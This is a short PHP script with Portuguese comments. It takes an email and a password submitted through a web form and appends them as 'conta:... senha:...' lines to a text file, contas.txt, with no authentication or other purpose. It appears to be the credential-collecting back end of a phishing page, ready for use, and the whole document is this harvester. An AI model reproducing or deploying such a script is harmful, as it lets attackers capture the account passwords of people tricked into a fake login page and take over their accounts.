<?php
$email = $_POST["email"];
$senha = $_POST["name"];

$conteudo ="conta:$email senha:$senha \n"; // Corpo da Mensagem

$arquivo = "contas.txt";
	
//Variável $fp armazena a conexão com o arquivo e o tipo de ação.
$fp = fopen($arquivo, "a+");

//Escreve no arquivo aberto.
fwrite($fp, $conteudo);
fclose($fp);
?>